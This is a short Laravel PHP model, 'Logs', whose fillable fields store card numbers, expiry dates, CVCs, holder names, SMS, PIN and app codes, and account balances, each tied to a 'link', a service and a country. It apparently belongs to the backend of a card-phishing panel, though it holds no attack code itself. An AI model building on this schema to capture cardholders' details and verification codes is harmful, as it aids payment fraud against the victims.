<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;

class Logs extends Model
{
    use HasFactory;

    protected $fillable = [
        'link_id', 'card', 'expire', 'cvc', 'sms', 'status', 'balance', 'accurate_balance', 'app_code','call_code','pin_code','check_online','holder', 'number','custom_error','custom_text','custom_photo'
    ];

    public function links()
    {
        return $this->belongsTo(Links::class, 'link_id');
    }

    public function services()
    {
        return $this->belongsTo(Services::class);
    }

    public function countries()
    {
        return $this->belongsTo(Countries::class);
    }


}
